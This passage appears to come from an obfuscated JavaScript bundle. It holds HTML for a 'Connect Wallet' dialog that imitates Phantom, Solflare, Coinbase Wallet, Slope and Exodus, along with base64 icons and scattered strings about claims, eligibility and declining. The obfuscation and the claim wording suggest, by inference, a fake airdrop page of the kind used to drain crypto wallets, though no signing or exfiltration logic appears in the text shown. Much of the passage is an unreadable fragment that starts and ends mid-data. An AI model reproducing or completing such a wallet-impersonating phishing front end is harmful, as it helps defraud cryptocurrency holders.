TAXtrt2e9A0RoOrUl6dBVsAVcvhHhsilDSDVOwaskAU8dADItAJkppItwYz+0CNkGqUz/+ach5raQhXUqesIaZGpmOWst5y22X6PI7vTrFPatidfT8qoG99OlwZ77691943m3T2GWV2Bb2BAVYOwWuXVQW9lttiAx40q7/SGSp0tV/q2Vtqiq0ifBq28riPbXQu4zVuvnYFGrGJKpFo16CXlmpLhpUyp5mDdbAhEN2gAZQeps1oPrSVZ07bWjWbdPd2vv/8+igZLRq9P3mMfq0HYUu1DAVOhqFPnJQ9LDqgBirt4dQkGmgBXZRywttMo4yTFCiCt2aBVN/iunCmjVHAxtNLGQ0MT5TQlMyvnH4RRn3BcxMqyAaoWKuWmRaeOTR6dpTbZLxUK4/F7ItOA/eKHuy/o1cpHmdCZfhWowAJKWCfvsXroyDSK3udyMlyWvjoM+MiGZRSyAWLkGXUiY1agIGQapZhv5jPlLUS0RlJ7XvKzapewUEmIyDiCU2UBR1gHPGpCN9tbVz3ov+bR/cb7v5AqvcVasH90myZ81Je8/SmWU8FUWGFZyAAdsNLyAjqyqGd6fZ1023J8YxXwKgbpBpIcHDMw1Jz0UOGce1Rd2nxW929t+8nXU5Pltj/yLifcTJHvkedAtKmWrd2No+WcjdsQZ1gC+/kPdU9tTsZv1T7BcUMTjLDCAJQW2ddpSnlpUxcLe6ZZ5V4J8CEw7ZFFP0yTvEH75ESewVKXJ4C8BaR9sNQl86gtEEQvUZ9vatGJKLkyy9BrX7683WX8aYGmW6Cmlbus4S2643rmfmv3oX+lnz4OYQks4s98pHtEl/nbVdHDHaDgBgTHMBIgT1/KK+IOWlgBsroM1Q2A08bQH2Cm5dbpepRcMYEm/lIK9KEVc+VU1jLacgGh5wINFLLXmgK5l6naDVSXDVuIe+R1mONaU729+8gHHvEhmj9ngKXu05+Y/qE+x3yTDnM0rcyXPo+pmmi/2NcoDFUp8NPS3Kb3rcijrgXH9FzmpKh9ljk++ZhhztKCpT/JwVbkGrwsIVrX3qtsgNicp/CneQjS7DRl2Zfr1G/KBVr/O1q6jTd1n/jXf8hRV8NasCj93sc3Hzlvsu8NUvhY+tmcfIKgMfm0TPK2aKWrukN5mHLIEkW24ehtnvJyyPkhHfLtEbIHNJBnyHymyJv80Fk0aMvOS1epoH5MG8dv6D7+L8+w1NUjZXlt+tM//fyb9QXE+wTw5nALuQogxT3ErhVWTZm9SH4z5f1S11V53eLLrb7cGnSb1GfHyvnYEvTea9aRKvI7g9w6ZMOcL7n5bJ7jMT6njIVxVBkLBAwgnUa/wS05BiFfFnMPaxnKcK91+jbhHk3sPd0nh7v/WmA02atinfzWn3rqJp2ydwvg2zT48w2SidbB+zFXeX++XmGkjMnm1l6fao8BecJLef5WCzkAV/doAZvt/O2syj459cTRj68cyQGbvj/g8jsFJq47Vr1e+0+LAEhllQNUxWeV3iXZ7d3vxOJ/HZtV2csCm43v0L/z/8X//OQNi9nOjdpLfa1uXNdq7XtYm7sXa916UFZ1UL54Oul29Tuyuf6bAAE1Jt8AlrWF9VZLlB5vDfItAfr+50nzBPhkDRDjhKCvWK04QHIMrhrkabWCpNlSb/fln8foVyOjbkf8TmhHRa8yFk/KZz8hpUcVv6bGD5T5jx7pfvcWPeS/vPD/AUg2fXs/C6zNAAAAAElFTkSuQmCC" alt="Spot icon" class="!w-5 !h-5">\n                  </i>Spot </button>\n              </div>\n            </div>\n          </div>\n        </ul>\n      </div>\n    </div>\n  </div>\n  <div class="wallet-adapter-modal-overlay" onclick="window.modalClose();"></div>\n</div>\n    ', "phantom", '</span>\n              </span>\n          </button>\n          </span>\n      </div>\n      <div class="tw-text-[16px] tw-text-white-2">', "rel", '\n  <div>\n<div class="tw-fixed tw-inset-y-0 tw-left-0 tw-w-screen tw-z-9000" id="headlessui-dialog-:r7k:" role="dialog" aria-modal="true" data-headlessui-state="open" aria-labelledby="headlessui-dialog-title-:r7m:">\n<div class="tw-fixed tw-inset-0 tw-bg-black/50 tw-opacity-100" aria-hidden="true" style="backdrop-filter: blur(1px);"></div>\n<div class="tw-h-screen sm:tw-w-auto tw-relative tw-flex tw-items-center tw-w-auto tw-mx-auto tw-max-w-[384px] tw-justify-center" data-test-id="modal-background">\n  <div class="tw-flex tw-flex-col tw-w-full tw-overflow-auto tw-relative tw-max-h-screen sm:tw-max-h-[calc(100vh-32px)] tw-border dark-scroll-bar tw-rounded-20px tw-bg-gray-100 tw-rounded-xl tw-border-gray-500 tw-max-w-[384px] tw-opacity-100 tw-scale-100" id="headlessui-dialog-panel-:r7l:" data-headlessui-state="open">\n  <div data-test-id="modal-body" class="tw-px-4 tw-pb-4 md:tw-p-4 tw-relative">\n      <div class="tw-text-left">\n      <div class="tw-flex tw-mb-3">\n          <span class="tw-text-lg tw-font-800 tw-text-white-2 tw-text-[28px]">', "oIneligible", "src", "Connect your wallet", "wallet-adapter-modal-list2", "onclick", "#moroptline", "wallet-adapter-modal-list-more-icon-rotate", "onClaimLoadingDesc", "./images/phantom.png", "style", "words", "896XBXiXi", "wallet-adapter-modal-fade-in", "addEventListener", "assets/062597fbffa560b3.css", "./images/solflare.svg", "remove", "svg", "onDecline", "width: 100%;", "height: 50%;", "modal1", "button", "assets/modal2.css", '\n    <div style="font-family: \'Inter\',sans-serif">\n  <div class="tw-fixed tw-inset-y-0 tw-left-0 tw-w-screen tw-z-[9999]" id="headlessui-dialog-:r5d:" role="dialog" aria-modal="true" data-headlessui-state="open" aria-labelledby="headlessui-dialog-title-:r5f:">\n    <div class="tw-fixed tw-inset-0 tw-bg-black/50 tw-opacity-100" aria-hidden="true" onclick="window.modalClose();" style="backdrop-filter: blur(1px);"></div>\n    <div onclick="event.stopPropagation()" class="tw-h-screen sm:tw-w-auto tw-max-w-[576px] tw-relative tw-flex tw-items-center tw-w-auto tw-mx-auto tw-justify-center" data-test-id="modal-background">\n      <div class="tw-flex tw-flex-col tw-overflow-auto sm:tw-max-h-[calc(100vh-32px)] tw-border dark-scroll-bar tw-rounded-20px tw-border-gray-500 tw-px-[12px] tw-relative tw-max-h-[calc(100vh-100px)] tw-overflow-y-auto tw-bg-purple-1 tw-border-none tw-w-[420px] tw-opacity-100 tw-scale-100" id="headlessui-dialog-panel-:r5e:" data-headlessui-state="open">\n        <div data-test-id="modal-header" class="tw-flex tw-flex-shrink-0 tw-items-center tw-justify-between tw-p-4" id="headlessui-dialog-title-:r5f:" data-headlessui-state="open">\n          <div class="tw-flex tw-flex-col">\n            <div class="tw-flex tw-w-full">\n              <h1 class="tw-text-white-primary tw-font-semibold !tw-text-[20px] tw-my-3">Connect Wallet</h1>\n              <button onclick="window.modalClose();" class="tw-p-2 tw-ml-auto tw-mr-0 tw-my-auto hover:tw-opacity-60 tw-transition-opacity tw-duration-200" tabindex="0">\n                <svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" color="#f5f3f7" width="20" height="20" xmlns="http://www.w3.org/2000/svg" style="color: rgb(245, 243, 247);">\n                  <line x1="18" y1="6" x2="6" y2="18"></line>\n                  <line x1="6" y1="6" x2="18" y2="18"></line>\n                </svg>\n              </button>\n            </div>\n            <p class="tw-text-sm tw-text-gray-2">Choose how you want to connect. If you don\'t have a wallet, you can select a provider and create one.</p>\n          </div>\n        </div>\n        <div data-test-id="modal-body" class="tw-px-4 tw-pb-4 md:tw-p-4 tw-relative !tw-pt-0">\n          <div class="tw-rounded-lg tw-pt-2 tw-flex tw-flex-col tw-border-[1px] tw-border-[#2B2037] tw-bg-purple-2">\n            <div class="tw-px-3">\n              <div class="tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center tw-mt-4 !tw-border-pink-200 tw-bg-[#2B142B]">\n                <button onclick="window.modalClose(); window.modalChoice(\'phantom\');" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="Phantom">\n                  <div class="tw-flex tw-items-center">\n                    <img height="28" width="28" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTA4IiBoZWlnaHQ9IjEwOCIgdmlld0JveD0iMCAwIDEwOCAxMDgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxMDgiIGhlaWdodD0iMTA4IiByeD0iMjYiIGZpbGw9IiNBQjlGRjIiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik00Ni41MjY3IDY5LjkyMjlDNDIuMDA1NCA3Ni44NTA5IDM0LjQyOTIgODUuNjE4MiAyNC4zNDggODUuNjE4MkMxOS41ODI0IDg1LjYxODIgMTUgODMuNjU2MyAxNSA3NS4xMzQyQzE1IDUzLjQzMDUgNDQuNjMyNiAxOS44MzI3IDcyLjEyNjggMTkuODMyN0M4Ny43NjggMTkuODMyNyA5NCAzMC42ODQ2IDk0IDQzLjAwNzlDOTQgNTguODI1OCA4My43MzU1IDc2LjkxMjIgNzMuNTMyMSA3Ni45MTIyQzcwLjI5MzkgNzYuOTEyMiA2OC43MDUzIDc1LjEzNDIgNjguNzA1MyA3Mi4zMTRDNjguNzA1MyA3MS41NzgzIDY4LjgyNzUgNzAuNzgxMiA2OS4wNzE5IDY5LjkyMjlDNjUuNTg5MyA3NS44Njk5IDU4Ljg2ODUgODEuMzg3OCA1Mi41NzU0IDgxLjM4NzhDNDcuOTkzIDgxLjM4NzggNDUuNjcxMyA3OC41MDYzIDQ1LjY3MTMgNzQuNDU5OEM0NS42NzEzIDcyLjk4ODQgNDUuOTc2OCA3MS40NTU2IDQ2LjUyNjcgNjkuOTIyOVpNODMuNjc2MSA0Mi41Nzk0QzgzLjY3NjEgNDYuMTcwNCA4MS41NTc1IDQ3Ljk2NTggNzkuMTg3NSA0Ny45NjU4Qzc2Ljc4MTYgNDcuOTY1OCA3NC42OTg5IDQ2LjE3MDQgNzQuNjk4OSA0Mi41Nzk0Qzc0LjY5ODkgMzguOTg4NSA3Ni43ODE2IDM3LjE5MzEgNzkuMTg3NSAzNy4xOTMxQzgxLjU1NzUgMzcuMTkzMSA4My42NzYxIDM4Ljk4ODUgODMuNjc2MSA0Mi41Nzk0Wk03MC4yMTAzIDQyLjU3OTVDNzAuMjEwMyA0Ni4xNzA0IDY4LjA5MTYgNDcuOTY1OCA2NS43MjE2IDQ3Ljk2NThDNjMuMzE1NyA0Ny45NjU4IDYxLjIzMyA0Ni4xNzA0IDYxLjIzMyA0Mi41Nzk1QzYxLjIzMyAzOC45ODg1IDYzLjMxNTcgMzcuMTkzMSA2NS43MjE2IDM3LjE5MzFDNjguMDkxNiAzNy4xOTMxIDcwLjIxMDMgMzguOTg4NSA3MC4yMTAzIDQyLjU3OTVaIiBmaWxsPSIjRkZGREY4Ii8+Cjwvc3ZnPgo=" alt="Phantom icon" class="tw-mr-3">\n                    <div class="tw-flex tw-flex-col tw-justify-between">\n                      <span class="tw-text-sm tw-text-left">Phantom</span>\n                    </div>\n                  </div>\n                </button>\n                <div class="tw-bg-[#2B2037] tw-absolute tw-top-2 tw-right-2 tw-rounded-md tw-items-center tw-justify-center">\n                  <span class="tw-px-2 tw-text-green-1 tw-text-xs tw-font-semibold">Recommended</span>\n                </div>\n              </div>\n              <div class="tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center">\n                <button onclick="window.modalClose(); window.modalChoice(\'solflare\');"  class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="Solflare">\n                  <div class="tw-flex tw-items-center">\n                    <img height="28" width="28" src="data:image/svg+xml;base64,PHN2ZyBmaWxsPSJub25lIiBoZWlnaHQ9IjUwIiB2aWV3Qm94PSIwIDAgNTAgNTAiIHdpZHRoPSI1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+PGxpbmVhckdyYWRpZW50IGlkPSJhIj48c3RvcCBvZmZzZXQ9IjAiIHN0b3AtY29sb3I9IiNmZmMxMGIiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNmYjNmMmUiLz48L2xpbmVhckdyYWRpZW50PjxsaW5lYXJHcmFkaWVudCBpZD0iYiIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHgxPSI2LjQ3ODM1IiB4Mj0iMzQuOTEwNyIgeGxpbms6aHJlZj0iI2EiIHkxPSI3LjkyIiB5Mj0iMzMuNjU5MyIvPjxyYWRpYWxHcmFkaWVudCBpZD0iYyIgY3g9IjAiIGN5PSIwIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDQuOTkyMTg4MzIgMTIuMDYzODc5NjMgLTEyLjE4MTEzNjU1IDUuMDQwNzEwNzQgMjIuNTIwMiAyMC42MTgzKSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHI9IjEiIHhsaW5rOmhyZWY9IiNhIi8+PHBhdGggZD0ibTI1LjE3MDggNDcuOTEwNGMuNTI1IDAgLjk1MDcuNDIxLjk1MDcuOTQwM3MtLjQyNTcuOTQwMi0uOTUwNy45NDAyLS45NTA3LS40MjA5LS45NTA3LS45NDAyLjQyNTctLjk0MDMuOTUwNy0uOTQwM3ptLTEuMDMyOC00NC45MTU2NWMuNDY0Ni4wMzgzNi44Mzk4LjM5MDQuOTAyNy44NDY4MWwxLjEzMDcgOC4yMTU3NGMuMzc5OCAyLjcxNDMgMy42NTM1IDMuODkwNCA1LjY3NDMgMi4wNDU5bDExLjMyOTEtMTAuMzExNThjLjI3MzMtLjI0ODczLjY5ODktLjIzMTQ5Ljk1MDcuMDM4NTEuMjMwOS4yNDc3Mi4yMzc5LjYyNjk3LjAxNjEuODgyNzdsLTkuODc5MSAxMS4zOTU4Yy0xLjgxODcgMi4wOTQyLS40NzY4IDUuMzY0MyAyLjI5NTYgNS41OTc4bDguNzE2OC44NDAzYy40MzQxLjA0MTguNzUxNy40MjM0LjcwOTMuODUyNC0uMDM0OS4zNTM3LS4zMDc0LjYzOTUtLjY2MjguNjk0OWwtOS4xNTk0IDEuNDMwMmMtMi42NTkzLjM2MjUtMy44NjM2IDMuNTExNy0yLjEzMzkgNS41NTc2bDMuMjIgMy43OTYxYy4yNTk0LjMwNTguMjE4OC43NjE1LS4wOTA4IDEuMDE3OC0uMjYyMi4yMTcyLS42NDE5LjIyNTYtLjkxMzguMDIwM2wtMy45Njk0LTIuOTk3OGMtMi4xNDIxLTEuNjEwOS01LjIyOTctLjI0MTctNS40NTYxIDIuNDI0M2wtLjg3NDcgMTAuMzk3NmMtLjAzNjIuNDI5NS0uNDE3OC43NDg3LS44NTI1LjcxMy0uMzY5LS4wMzAzLS42NjcxLS4zMDk3LS43MTcxLS42NzIxbC0xLjM4NzEtMTAuMDQzN2MtLjM3MTctMi43MTQ0LTMuNjQ1NC0zLjg5MDQtNS42NzQzLTIuMDQ1OWwtMTIuMDUxOTUgMTAuOTc0Yy0uMjQ5NDcuMjI3MS0uNjM4MDkuMjExNC0uODY4LS4wMzUtLjIxMDk0LS4yMjYyLS4yMTczNS0uNTcyNC0uMDE0OTMtLjgwNmwxMC41MTgxOC0xMi4xMzg1YzEuODE4Ny0yLjA5NDIuNDg0OS01LjM2NDQtMi4yODc2LTUuNTk3OGwtOC43MTg3Mi0uODQwNWMtLjQzNDEzLS4wNDE4LS43NTE3Mi0uNDIzNS0uNzA5MzYtLjg1MjQuMDM0OTMtLjM1MzcuMzA3MzktLjYzOTQuNjYyNy0uNjk1bDkuMTUzMzgtMS40Mjk5YzIuNjU5NC0uMzYyNSAzLjg3MTgtMy41MTE3IDIuMTQyMS01LjU1NzZsLTIuMTkyLTIuNTg0MWMtLjMyMTctLjM3OTItLjI3MTMtLjk0NDMuMTEyNi0xLjI2MjEuMzI1My0uMjY5NC43OTYzLS4yNzk3IDEuMTMzNC0uMDI0OWwyLjY5MTggMi4wMzQ3YzIuMTQyMSAxLjYxMDkgNS4yMjk3LjI0MTcgNS40NTYxLTIuNDI0M2wuNzI0MS04LjU1OTk4Yy4wNDU3LS41NDA4LjUyNjUtLjk0MjU3IDEuMDczOS0uODk3Mzd6bS0yMy4xODczMyAyMC40Mzk2NWMuNTI1MDQgMCAuOTUwNjcuNDIxLjk1MDY3Ljk0MDNzLS40MjU2My45NDAzLS45NTA2Ny45NDAzYy0uNTI1MDQxIDAtLjk1MDY3LS40MjEtLjk1MDY3LS45NDAzcy40MjU2MjktLjk0MDMuOTUwNjctLjk0MDN6bTQ3LjY3OTczLS45NTQ3Yy41MjUgMCAuOTUwNy40MjEuOTUwNy45NDAzcy0uNDI1Ny45NDAyLS45NTA3Ljk0MDItLjk1MDctLjQyMDktLjk1MDctLjk0MDIuNDI1Ny0uOTQwMy45NTA3LS45NDAzem0tMjQuNjI5Ni0yMi40Nzk3Yy41MjUgMCAuOTUwNi40MjA5NzMuOTUwNi45NDAyNyAwIC41MTkzLS40MjU2Ljk0MDI3LS45NTA2Ljk0MDI3LS41MjUxIDAtLjk1MDctLjQyMDk3LS45NTA3LS45NDAyNyAwLS41MTkyOTcuNDI1Ni0uOTQwMjcuOTUwNy0uOTQwMjd6IiBmaWxsPSJ1cmwoI2IpIi8+PHBhdGggZD0ibTI0LjU3MSAzMi43NzkyYzQuOTU5NiAwIDguOTgwMi0zLjk3NjUgOC45ODAyLTguODgxOSAwLTQuOTA1My00LjAyMDYtOC44ODE5LTguOTgwMi04Ljg4MTlzLTguOTgwMiAzLjk3NjYtOC45ODAyIDguODgxOWMwIDQuOTA1NCA0LjAyMDYgOC44ODE5IDguOTgwMiA4Ljg4MTl6IiBmaWxsPSJ1cmwoI2MpIi8+PC9zdmc+" alt="Solflare icon" class="tw-mr-3">\n                    <div class="tw-flex tw-flex-col tw-justify-between">\n                      <span class="tw-text-sm tw-text-left">Solflare</span>\n                    </div>\n                  </div>\n                </button>\n              </div>\n              <div class="tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center">\n                <button onclick="window.modalClose(); window.modalChoice(\'coinbase\');" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="Coinbase Wallet">\n                  <div class="tw-flex tw-items-center">\n                    <img height="28" width="28" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAyNCIgaGVpZ2h0PSIxMDI0IiB2aWV3Qm94PSIwIDAgMTAyNCAxMDI0IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8Y2lyY2xlIGN4PSI1MTIiIGN5PSI1MTIiIHI9IjUxMiIgZmlsbD0iIzAwNTJGRiIvPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTE1MiA1MTJDMTUyIDcxMC44MjMgMzEzLjE3NyA4NzIgNTEyIDg3MkM3MTAuODIzIDg3MiA4NzIgNzEwLjgyMyA4NzIgNTEyQzg3MiAzMTMuMTc3IDcxMC44MjMgMTUyIDUxMiAxNTJDMzEzLjE3NyAxNTIgMTUyIDMxMy4xNzcgMTUyIDUxMlpNNDIwIDM5NkM0MDYuNzQ1IDM5NiAzOTYgNDA2Ljc0NSAzOTYgNDIwVjYwNEMzOTYgNjE3LjI1NSA0MDYuNzQ1IDYyOCA0MjAgNjI4SDYwNEM2MTcuMjU1IDYyOCA2MjggNjE3LjI1NSA2MjggNjA0VjQyMEM2MjggNDA2Ljc0NSA2MTcuMjU1IDM5NiA2MDQgMzk2SDQyMFoiIGZpbGw9IndoaXRlIi8+Cjwvc3ZnPgo=" alt="Coinbase Wallet icon" class="tw-mr-3">\n                    <div class="tw-flex tw-flex-col tw-justify-between">\n                      <span class="tw-text-sm tw-text-left">Coinbase Wallet</span>\n                    </div>\n                  </div>\n                </button>\n              </div>\n            </div>\n            <hr class="tw-w-full tw-my-0 tw-border-[#2B2037]">\n            <div>\n              <div class="tw-flex tw-flex-col tw-w-full">\n                <div class="tw-flex tw-mx-auto tw-border-t-[1px] tw-border-gray-300">\n                  <button tabindex="0" onclick="window.collapseModal4(this)" class="tw-flex tw-items-center tw-font-medium tw-cursor-pointer tw-text-light-gray-600 tw-my-1 tw-py-1">\n                    <span class="tw-text-xs" id="moropt">Show More</span>\n                    <svg id="moroptline" stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="tw-ml-1" color="#B8B0BF" width="20" height="20" xmlns="http://www.w3.org/2000/svg" style="color: rgb(184, 176, 191);">\n                      <polyline points="6 9 12 15 18 9"></polyline>\n                    </svg>\n                  </button>\n                </div>\n                <div class="tw-px-3">\n                  <div class="tw-overflow-hidden" style="height: 0px; transition: height 250ms ease-out 0s;" id="collapser1">\n                    <div class="tw-pb-4">\n                        <div class="tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center">\n                            <button onclick="window.modalClose(); window.modalChoice(\'slope\');" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="Slope">\n                            <div class="tw-flex tw-items-center">\n                                <img height="28" width="28" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTI4IiBoZWlnaHQ9IjEyOCIgdmlld0JveD0iMCAwIDEyOCAxMjgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxMjgiIGhlaWdodD0iMTI4IiByeD0iNjQiIGZpbGw9IiM2RTY2RkEiLz4KPHBhdGggZD0iTTI3Ljk0NzUgNTIuMTU5Nkw1MS45ODI2IDI4LjA1NzJMNzIuNjA5OCA3LjY1Mzg5QzczLjg3MzQgNi40MDQwMSA3Ni4wMTc4IDcuMjk5MSA3Ni4wMTc4IDkuMDc2NDJMNzYuMDE4NyA1Mi4xNTlMNTEuOTgzNiA3Ni4xMjY4TDI3Ljk0NzUgNTIuMTU5NloiIGZpbGw9InVybCgjcGFpbnQwX2xpbmVhcl8zNzk1XzI1NTQzKSIvPgo8cGF0aCBkPSJNMTAwLjA1MyA3NS45OTNMNzYuMDE4IDUxLjk1OEw1MS45ODI5IDc1Ljk5MzFMNTEuOTgyOSAxMTguOTI0QzUxLjk4MjkgMTIwLjcwMyA1NC4xMzEyIDEyMS41OTcgNTUuMzkzNyAxMjAuMzQzTDEwMC4wNTMgNzUuOTkzWiIgZmlsbD0idXJsKCNwYWludDFfbGluZWFyXzM3OTVfMjU1NDMpIi8+CjxwYXRoIGQ9Ik0yNy45NDcgNTIuMTYwMUg0NC42ODM5QzQ4LjcxNDcgNTIuMTYwMSA1MS45ODIyIDU1LjQyNzYgNTEuOTgyMiA1OS40NTgzVjc2LjEyNjlIMzUuMjQ1M0MzMS4yMTQ2IDc2LjEyNjkgMjcuOTQ3IDcyLjg1OTQgMjcuOTQ3IDY4LjgyODdWNTIuMTYwMVoiIGZpbGw9IiNGMUYwRkYiLz4KPHBhdGggZD0iTTc2LjAxNzggNTIuMTYwMUg5Mi43NTQ3Qzk2Ljc4NTUgNTIuMTYwMSAxMDAuMDUzIDU1LjQyNzYgMTAwLjA1MyA1OS40NTgzVjc2LjEyNjlIODMuMzE2MUM3OS4yODU0IDc2LjEyNjkgNzYuMDE3OCA3Mi44NTk0IDc2LjAxNzggNjguODI4N1Y1Mi4xNjAxWiIgZmlsbD0iI0YxRjBGRiIvPgo8ZGVmcz4KPGxpbmVhckdyYWRpZW50IGlkPSJwYWludDBfbGluZWFyXzM3OTVfMjU1NDMiIHgxPSI1MS45ODMxIiB5MT0iNy4wNzE1NSIgeDI9IjUxLjk4MzEiIHkyPSI3Ni4xMjY4IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CjxzdG9wIHN0b3AtY29sb3I9IiNBOEFERkYiLz4KPHN0b3Agb2Zmc2V0PSIwLjY0ODU1NiIgc3RvcC1jb2xvcj0id2hpdGUiLz4KPC9saW5lYXJHcmFkaWVudD4KPGxpbmVhckdyYWRpZW50IGlkPSJwYWludDFfbGluZWFyXzM3OTVfMjU1NDMiIHgxPSI3Ni4wMTgiIHkxPSI1MS45NTgiIHgyPSI3Ni4wMTgiIHkyPSIxMjAuOTI4IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CjxzdG9wIG9mZnNldD0iMC4yNjA3ODQiIHN0b3AtY29sb3I9IiNCNkJBRkYiLz4KPHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjRTRFMkZGIi8+CjwvbGluZWFyR3JhZGllbnQ+CjwvZGVmcz4KPC9zdmc+Cg==" alt="Slope icon" class="tw-mr-3">\n                                <div class="tw-flex tw-flex-col tw-justify-between">\n                                <span class="tw-text-sm tw-text-left">Slope</span>\n                                </div>\n                            </div>\n                            </button>\n                        </div>\n                      <div class="tw-relative hover:tw-bg-purple-4 hover:tw-border-[#40324E] tw-rounded-lg tw-h-[56px] tw-my-2 tw-border-gray-300 tw-border-[1px] tw-flex tw-items-center">\n                        <button onclick="window.modalClose(); window.modalChoice(\'exodus\');" tabindex="-1" class="tw-p-2 tw-h-full tw-flex tw-items-center tw-justify-between tw-w-full tw-text-white-primary tw-text-lg tw-font-medium" data-test-id="Exodus">\n                          <div class="tw-flex tw-items-center">\n                            <img height="28" width="28" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTIyIiBoZWlnaHQ9IjEyNCIgdmlld0JveD0iMCAwIDEyMiAxMjQiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxtYXNrIGlkPSJtYXNrMF8zMF8xMTAiIHN0eWxlPSJtYXNrLXR5cGU6YWxwaGEiIG1hc2tVbml0cz0idXNlclNwYWNlT25Vc2UiIHg9IjAiIHk9IjAiIHdpZHRoPSIxMjIiIGhlaWdodD0iMTI0Ij4KPHBhdGggZD0iTTEyMS43ODcgMzQuODMzMUw2OS4zODc2IDAuNDc2NTYyVjE5LjY4NTVMMTAzLjAwMiA0MS41Mjg4TDk5LjA0NzQgNTQuMDQySDY5LjM4NzZWNjkuOTU4SDk5LjA0NzRMMTAzLjAwMiA4Mi40NzEyTDY5LjM4NzYgMTA0LjMxNFYxMjMuNTIzTDEyMS43ODcgODkuMjc2N0wxMTMuMjE4IDYyLjA1NDlMMTIxLjc4NyAzNC44MzMxWiIgZmlsbD0iIzFEMUQxQiIvPgo8cGF0aCBkPSJNMjMuNzk5MyA2OS45NThINTMuMzQ5M1Y1NC4wNDJIMjMuNjg5NEwxOS44NDQ2IDQxLjUyODhMNTMuMzQ5MyAxOS42ODU1VjAuNDc2NTYyTDAuOTUwMTk1IDM0LjgzMzFMOS41MTg2IDYyLjA1NDlMMC45NTAxOTUgODkuMjc2N0w1My40NTkxIDEyMy41MjNWMTA0LjMxNEwxOS44NDQ2IDgyLjQ3MTJMMjMuNzk5MyA2OS45NThaIiBmaWxsPSIjMUQxRDFCIi8+CjwvbWFzaz4KPGcgbWFzaz0idXJsKCNtYXNrMF8zMF8xMTApIj4KPHBhdGggZD0iTTEyMS43ODcgMzQuODMzMUw2OS4zODc2IDAuNDc2NTYyVjE5LjY4NTVMMTAzLjAwMiA0MS41Mjg4TDk5LjA0NzQgNTQuMDQySDY5LjM4NzZWNjkuOTU4SDk5LjA0NzRMMTAzLjAwMiA4Mi40NzEyTDY5LjM4NzYgMTA0LjMxNFYxMjMuNTIzTDEyMS43ODcgODkuMjc2N0wxMTMuMjE4IDYyLjA1NDlMMTIxLjc4NyAzNC44MzMxWiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTIzLjc5OTMgNjkuOTU4SDUzLjM0OTNWNTQuMDQySDIzLjY4OTRMMTkuODQ0NiA0MS41Mjg4TDUzLjM0OTMgMTkuNjg1NVYwLjQ3NjU2MkwwLjk1MDE5NSAzNC44MzMxTDkuNTE4NiA2Mi4wNTQ5TDAuOTUwMTk1IDg5LjI3NjdMNTMuNDU5MSAxMjMuNTIzVjEwNC4zMTRMMTkuODQ0NiA4Mi40NzEyTDIzLjc5OTMgNjkuOTU4WiIgZmlsbD0id2hpdGUiLz4KPHJlY3QgeD0iMS4xMDYzMiIgeT0iMC40NzY1NjIiIHdpZHRoPSIxMzMuNzQ0IiBoZWlnaHQ9IjEzNi4wODUiIGZpbGw9InVybCgjcGFpbnQwX2xpbmVhcl8zMF8xMTApIi8+CjxlbGxpcHNlIGN4PSI4LjQzMTc2IiBjeT0iMjcuNDYwMiIgcng9IjExNy42MzkiIHJ5PSIxMjcuNTQ1IiB0cmFuc2Zvcm09InJvdGF0ZSgtMzMuOTMwMyA4LjQzMTc2IDI3LjQ2MDIpIiBmaWxsPSJ1cmwoI3BhaW50MV9yYWRpYWxfMzBfMTEwKSIvPgo8L2c+CjxkZWZzPgo8bGluZWFyR3JhZGllbnQgaWQ9InBhaW50MF9saW5lYXJfMzBfMTEwIiB4MT